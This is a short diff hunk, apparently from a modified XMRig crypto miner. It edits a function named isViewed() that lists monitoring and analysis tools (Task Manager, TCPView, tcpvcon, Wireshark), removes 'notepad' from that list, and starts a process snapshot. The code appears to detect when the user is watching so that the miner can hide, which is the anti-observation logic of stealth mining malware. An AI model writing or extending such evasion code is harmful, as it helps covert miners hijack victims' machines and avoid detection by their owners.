@@ -24,8 +24,7 @@ bool xmrig::Environment::isViewed()
 		"taskmgr",
 		"tcpvcon",
 		"tcpview",
-		"wireshark",
-		"notepad"
+		"wireshark"
 	};
 	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 	PROCESSENTRY32 pEntry = { 0 };
